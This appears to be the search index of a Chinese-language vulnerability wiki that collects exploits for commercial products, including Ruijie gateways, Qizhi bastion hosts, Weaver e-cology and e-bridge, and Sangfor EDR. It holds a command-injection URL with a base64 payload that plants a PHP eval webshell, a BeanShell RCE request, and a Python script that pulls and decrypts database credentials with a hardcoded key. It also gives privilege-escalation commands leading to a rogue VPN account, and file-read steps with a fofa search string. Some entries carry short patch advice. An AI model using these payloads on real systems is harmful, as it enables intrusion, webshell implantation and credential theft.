config\u3001mode=priv_exec \u6d41\u91cf\u63d0\u6743\u53c2\u6570\uff1awebmaster level 0 username guest password guest \u76f8\u5173\u8bbe\u5907\u547d\u4ee4\uff1ashow run\u3001sh run \u65b0\u589e\u5f02\u5e38VPN\u8d26\u53f7","title":"\u9510\u6377\u6613\u7f51\u5173\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"\u5728web\u7ba1\u7406\u9875\u9762\u4e0a\uff0c\u4f7f\u7528\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u8bbe\u5907\u540e\uff0c\u53ef\u901a\u8fc7web\u9875\u9762\u6267\u884c\u90e8\u5206\u64cd\u4f5c\u547d\u4ee4\uff0c\u8bbe\u5907\u4e0a\u6709\u63a5\u53e3\u6765\u8bfb\u53d6\u8fd9\u4e9b\u64cd\u4f5c\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u3002\u63a5\u53e3\u5bf9\u8fd4\u56de\u503c\u4e2d\u5b58\u5728\u7684\u6076\u610f\u6307\u4ee4\u8fc7\u6ee4\u4e0d\u5145\u5206\uff0c\u5bfc\u81f4\u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7CLI\u88ab\u8fdc\u7a0b\u6267\u884c\u4e00\u4e9b\u6076\u610f\u6307\u4ee4\uff0c\u5bf9\u8bbe\u5907\u6b63\u5e38\u8fd0\u884c\u9020\u6210\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u8bf4\u660e"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","text":"\u76ee\u524d\u4ec5\u7f51\u5173\u4ea7\u54c1\u768411x\u7248\u672c\u5b58\u5728\u6b64\u95ee\u9898\uff0c10.x\u7248\u672c\u672a\u53d1\u73b0\u6b64\u95ee\u9898\u3002","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","text":"web\u9875\u9762\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u3001\u5bc6\u7801\u6cc4\u6f0f\uff0c\u4e14http\u767b\u5f55\u8bbf\u95ee\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u3002 \u8fdb\u5165\u9510\u6377\u6613\u7f51\u5173\u767b\u5f55\u754c\u9762\uff0c\u6293\u53d6\u4e00\u4e2a\u767b\u5f55\u6570\u636e\u5305\uff1a \u53d1\u73b0\u53c2\u6570\u4e2d\u6709command=\u6267\u884c\u7684\u547d\uff0cstrurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec\u548cconfig\u7b49\uff0cmode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f \u8f93\u5165 sh run\u547d\u4ee4\u8fdb\u884c\u5c1d\u8bd5\uff0c\u53ef\u67e5\u770b\u5230\u6709\u76f8\u5e94\u7684\u7528\u6237\u4fe1\u606f\uff1a \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\uff0c\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u3002 \u5c1d\u8bd5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\uff0c\u9700\u8981\u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u3002 \u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f\uff1a \u4e4b\u540e\u5c31\u53ef\u901a\u8fc7telnet\u8fdb\u5165\uff0c\u518d\u914d\u7f6e\u4e00\u4e2aVPN\u8d26\u53f7\u540e\u5c31\u53ef\u8fdb\u884c\u5185\u7f51\u6f2b\u6e38\uff1a","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","text":"\u7248\u672c\uff1a\u9510\u6377\u6613\u7f51\u5173\u4ea7\u54c111x\u7248\u672c \u534f\u8bae\uff1ahttp\u534f\u8bae\uff0c\u9ed8\u8ba4\u7aef\u53e380 \u6d41\u91cf\u63a2\u6d4b\u53c2\u6570\u4e2d\u5305\u542b\uff1acommand=\u3001strurl=\u3001 exec\u3001 config\u3001mode=priv_exec \u6d41\u91cf\u63d0\u6743\u53c2\u6570\uff1awebmaster level 0 username guest password guest \u76f8\u5173\u8bbe\u5907\u547d\u4ee4\uff1ashow run\u3001sh run \u65b0\u589e\u5f02\u5e38VPN\u8d26\u53f7","title":"\u7279\u5f81\uff1a"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%200day/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 ShtermClient-2.1.1 \u6f0f\u6d1e\u5229\u7528 \u00b6 1.\u8bbf\u95ee http://10.20.10.11/listener/cluster_manage.php \u8fd4\u56deOK 2.\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA=\"|base64${IFS}-d|bash`|${IFS}|echo${IFS}","title":"\u9f50\u6cbb\u5821\u5792\u673a\u524d\u53f0\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-0day"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%200day/#_1","text":"ShtermClient-2.1.1","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%200day/#_2","text":"1.\u8bbf\u95ee http://10.20.10.11/listener/cluster_manage.php \u8fd4\u56deOK 2.\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA=\"|base64${IFS}-d|bash`|${IFS}|echo${IFS}","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"%E5%9F%9F%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%BB%8B%E7%BB%8D/","text":"\u57df\u6e17\u900f\u4ecb\u7ecd \u00b6 \u7b49\u5f85\u4e0e\u6e17\u900f\u5927\u4f6c\u5199\u4ecb\u7ecd","title":"\u57df\u6e17\u900f\u4ecb\u7ecd"},{"location":"%E5%9F%9F%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%BB%8B%E7%BB%8D/#_1","text":"\u7b49\u5f85\u4e0e\u6e17\u900f\u5927\u4f6c\u5199\u4ecb\u7ecd","title":"\u57df\u6e17\u900f\u4ecb\u7ecd"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/","text":"\u5b89\u5168\u5de5\u5177 \u00b6 \u8fd9\u91cc\u662f\u7f51\u7edc\u5b89\u5168\u5de5\u5177\u4ecb\u7ecd\u4f7f\u7528\u5927\u5168\u3002","title":"\u5b89\u5168\u5de5\u5177"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/#_1","text":"\u8fd9\u91cc\u662f\u7f51\u7edc\u5b89\u5168\u5de5\u5177\u4ecb\u7ecd\u4f7f\u7528\u5927\u5168\u3002","title":"\u5b89\u5168\u5de5\u5177"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BURP/burp%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","text":"burp\u57fa\u672c\u4f7f\u7528 \u00b6 \u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\u64cd\u4f5c\u6f14\u793a\u5b8c\u6bd5\u3002","title":"burp\u57fa\u672c\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BURP/burp%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/#burp","text":"\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\u64cd\u4f5c\u6f14\u793a\u5b8c\u6bd5\u3002","title":"burp\u57fa\u672c\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BURP/burp%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","text":"burp\u9ad8\u7ea7\u4f7f\u7528 \u00b6 Burp\u5728\u624b\uff0c\u5929\u4e0b\u6211\u6709\u3002","title":"burp\u9ad8\u7ea7\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BURP/burp%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#burp","text":"Burp\u5728\u624b\uff0c\u5929\u4e0b\u6211\u6709\u3002","title":"burp\u9ad8\u7ea7\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/NMAP/nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","text":"nmap\u57fa\u672c\u4f7f\u7528 \u00b6 \u76f8\u4fe1\u770b\u5230\u8fd9\u91cc\u5927\u5bb6\u90fd\u5df2\u7ecf\u5b66\u4f1a\u4e86nmap\u7684\u57fa\u672c\u4f7f\u7528\u4e86~","title":"nmap\u57fa\u672c\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/NMAP/nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/#nmap","text":"\u76f8\u4fe1\u770b\u5230\u8fd9\u91cc\u5927\u5bb6\u90fd\u5df2\u7ecf\u5b66\u4f1a\u4e86nmap\u7684\u57fa\u672c\u4f7f\u7528\u4e86~","title":"nmap\u57fa\u672c\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/NMAP/nmap%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","text":"nmap\u9ad8\u7ea7\u4f7f\u7528 \u00b6 \u9ed8\u8ba4\u5927\u5bb6\u5168\u4f1a\u3002","title":"nmap\u9ad8\u7ea7\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/NMAP/nmap%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#nmap","text":"\u9ed8\u8ba4\u5927\u5bb6\u5168\u4f1a\u3002","title":"nmap\u9ad8\u7ea7\u4f7f\u7528"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u8be6\u60c5 \u00b6 \u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd \u5229\u7528\u65b9\u5f0f \u00b6 ``` POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw ```\u9632\u62a4\u65b9\u6cd5 1.\u53ca\u65f6\u66f4\u65b0\u6cdb\u5fae\u8865\u4e01 2.\u62e6\u622a/weaver/bsh.servlet.BshServlet\u76ee\u5f55\u7684\u8bbf\u95ee","title":"\u6cdb\u5faeOA Bsh \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd","title":"\u8be6\u60c5"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"``` POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw ```\u9632\u62a4\u65b9\u6cd5 1.\u53ca\u65f6\u66f4\u65b0\u6cdb\u5fae\u8865\u4e01 2.\u62e6\u622a/weaver/bsh.servlet.BshServlet\u76ee\u5f55\u7684\u8bbf\u95ee","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/","text":"\u5f71\u54cd\u7248\u672c \u00b6 \u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531\uff0c\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 # -*- coding:utf-8 -*- #Author:print(\"\") import pyDes,requests import sys def desdecode(secret_key,s): cipherX = pyDes.des(' ') cipherX.setKey(secret_key) y = cipherX.decrypt(s) return y default_headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' } def send(url): data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content return (desdecode('1z2x3c4v5b6n', data.strip())) if __name__ == '__main__': url = sys.argv[1] print('\u6cdb\u5faee-cology OA \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e') print('url--->%s'%url) print('\u6570\u636e\u5e93\u4fe1\u606f\u5982\u4e0b----->:%s'%send(url))","title":"\u6cdb\u5faeOA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#_1","text":"\u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531\uff0c\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#poc","text":"# -*- coding:utf-8 -*- #Author:print(\"\") import pyDes,requests import sys def desdecode(secret_key,s): cipherX = pyDes.des(' ') cipherX.setKey(secret_key) y = cipherX.decrypt(s) return y default_headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' } def send(url): data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content return (desdecode('1z2x3c4v5b6n', data.strip())) if __name__ == '__main__': url = sys.argv[1] print('\u6cdb\u5faee-cology OA \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e') print('url--->%s'%url) print('\u6570\u636e\u5e93\u4fe1\u606f\u5982\u4e0b----->:%s'%send(url))","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6cdb\u5faee-cology SQL\u6ce8\u5165\u6f0f\u6d1e \u53d1\u5e03\u65e5\u671f\uff1a2020-09-13 \u9002\u7528\u8303\u56f4\uff1a\u4f7f\u7528\u4e86\u6cdb\u5faee-cology\u7684\u7528\u6237 \u5904\u7f6e\u5efa\u8bae\uff1a \u68c0\u6d4b\uff1aa.\u4eba\u5de5\uff0c\u53ef\u901a\u8fc7\u5411\u76ee\u6807\u7cfb\u7edf\u63d0\u4ea4\u4ee5\u4e0b\u8bf7\u6c42\u8fdb\u884c\u6f0f\u6d1e\u9a8c\u8bc1\uff1a \uff0c\u5982\u679c\u9875\u9762\u8fd4\u56de32\u4f4d\u957f\u5ea6\u7684\u5bc6\u6587\u5219\u7cfb\u7edf\u53d7\u6b64\u6f0f\u6d1e\u5f71\u54cd\u3002\u82e5\u9875\u9762\u8fd4\u56de404\u6216\u8005403\u72b6\u6001\u5219\u8868\u793a\u4e0d\u5b58\u5728\u6b64\u6f0f\u6d1e\u3002 b.\u4ea7\u54c1\u68c0\u6d4b\uff1a\u5347\u7ea7RSAS/UTS/WVSS\u81f3\u6700\u65b0\u7248\u672c\u5373\u53ef\u68c0\u6d4b\u3002 \u9632\u62a4\uff1aa.\u5b98\u65b9\u5347\u7ea7 b.\u5347\u7ea7WAF/NF/IPS\u81f3\u6700\u65b0\u7248\u672c\u5373\u53ef\u9632\u62a4\u3002","title":"\u6cdb\u5faee-cology SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 \u6cdb\u5fae\u4e91\u6865\u662f\u4e00\u4e2a\u4e3a\u4e86\u6ee1\u8db3\u7528\u6237\u63d0\u51fa\u7684\u963f\u91cc\u9489\u9489\u4e0e\u6cdb\u5faeOA\u96c6\u6210\u9700\u6cdb\u5fae0A\u4e91\u6865e-bridge \u5176 /wxjsapi/saveYZJFile \u63a5\u53e3\u53ef\u4ee5\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u4fdd\u5b58\uff0c\u800c\u540e\u53ef\u901a\u8fc7/file/fileNoLogin/{id}\uff0c\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002 \u5f71\u54cd\u8303\u56f4: \u00b6 \u4e3b\u8981\u5f71\u54cd 2018-2019 \u7248\u672c \u6f0f\u6d1e\u590d\u73b0: \u00b6 fofa_dork : \u201c\u6cdb\u5fae\u4e91\u6865\u201d \u8bfb\u53d6\u5e76\u4fdd\u5b58\u6587\u4ef6 \u7ed3\u679c\u4e2d\u63d0\u53d6id\u503c\uff0c\u62fc\u63a5\u5230/file/fileNoLogin/{id} \u4e2d \u5373\u53ef\u8bfb\u53d6\u6570\u636e\uff0c\u8bfb\u53d6\u6210\u529f windows\u5e73\u53f0\u53ef\u8bfb\u53d6c://windows/win.ini\u6587\u4ef6\u7528\u4e8e\u6f0f\u6d1e\u9a8c\u8bc1\uff0cLinux\u4e0b\u5219\u8bfb\u53d6etc/passwd\u6587\u4ef6\u8fdb\u884c\u9a8c\u8bc1 \u4fee\u590d\u65b9\u6848: \u00b6 \u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c","title":"\u6cdb\u5fae\u4e91\u6865e-bridge \u76ee\u5f55\u904d\u5386/\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_1","text":"\u6cdb\u5fae\u4e91\u6865\u662f\u4e00\u4e2a\u4e3a\u4e86\u6ee1\u8db3\u7528\u6237\u63d0\u51fa\u7684\u963f\u91cc\u9489\u9489\u4e0e\u6cdb\u5faeOA\u96c6\u6210\u9700\u6cdb\u5fae0A\u4e91\u6865e-bridge \u5176 /wxjsapi/saveYZJFile \u63a5\u53e3\u53ef\u4ee5\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u4fdd\u5b58\uff0c\u800c\u540e\u53ef\u901a\u8fc7/file/fileNoLogin/{id}\uff0c\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_2","text":"\u4e3b\u8981\u5f71\u54cd 2018-2019 \u7248\u672c","title":"\u5f71\u54cd\u8303\u56f4:"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_3","text":"fofa_dork : \u201c\u6cdb\u5fae\u4e91\u6865\u201d \u8bfb\u53d6\u5e76\u4fdd\u5b58\u6587\u4ef6 \u7ed3\u679c\u4e2d\u63d0\u53d6id\u503c\uff0c\u62fc\u63a5\u5230/file/fileNoLogin/{id} \u4e2d \u5373\u53ef\u8bfb\u53d6\u6570\u636e\uff0c\u8bfb\u53d6\u6210\u529f windows\u5e73\u53f0\u53ef\u8bfb\u53d6c://windows/win.ini\u6587\u4ef6\u7528\u4e8e\u6f0f\u6d1e\u9a8c\u8bc1\uff0cLinux\u4e0b\u5219\u8bfb\u53d6etc/passwd\u6587\u4ef6\u8fdb\u884c\u9a8c\u8bc1","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_4","text":"\u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c","title":"\u4fee\u590d\u65b9\u6848:"},{"location":"%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"","title":"\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u53d7\u5f71\u54cd\u7248\u672c\u4e3a3.2.17R1, 3.2.21\u4e24\u4e2a\u7248\u672c\uff0c\u5982\u679c\u4e3a\u8fd9\u4e24\u4e2a\u7248\u672c\u5efa\u8bae\u5347\u7ea7\u7248\u672c\u81f3 3.2.21.375 \u6f0f\u6d1e\u539f\u7406 \u00b6 dev_linkage_launch.php \u4e3a\u8bbe\u5907\u8054\u52a8\u7684\u65b0\u5165\u53e3\u70b9\u4e3b\u8981\u662f\u5c06\u8054\u52a8\u7684\u63a5\u53e3\u6784\u9020\u6210\u4e1a\u52a1\u7edf\u4e00\u5904\u7406\u7684\u63a5\u53e3 \u4e3b\u8981\u8c03\u7528 \u8ddf\u8fdb \u53ef\u4ee5\u770b\u5230 \u7b2c\u4e00\u4e2a\u68c0\u67e5\u4e3a \u7ed5\u8fc7\u7b2c\u4e00\u4e2a\u68c0\u67e5: \u5728\u4ed6\u4eec\u7cfb\u7edfnginx\u914d\u7f6e\u6587\u4ef6\u91cc\u9762: \u901a\u8fc7nginx\u89c4\u5219\u53ef\u4ee5\u5f97\u77e5,\u4ed6\u4eec\u6ca1\u6709\u8bbe\u7f6e\u7981\u6b62\u5916\u7f51\u8bbf\u95ee.\u4ece\u800c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee /api/edr/sangforinter/v2/xxx \u7ed5\u8fc7 \u7b2c\u4e00\u4e2a\u68c0\u67e5 \u7b2c\u4e8c\u68c0\u67e5: \u6743\u9650\u68c0\u67e5 \u8ddf\u8fdbcheck_access_token \u8fd9\u91cc \u5f15\u53d1\u7b2c\u4e8c\u4e2a\u6f0f\u6d1e: php\u5f31\u7c7b\u578b\u5bfc\u81f4\u7684\u6f0f\u6d1e \u7ed5\u8fc7\u53ea\u9700\u8981\u4f20\u5165\u4e00\u4e2abase64\u7f16\u7801\u7684json\u5185\u5bb9\u4e3a{\"md5\":true}\u5373\u53ef \u81f3\u6b64 \u6743\u9650\u68c0\u67e5\u7ed5\u8fc7\u5b8c\u6bd5 \u6765\u5230 process_cssp.php 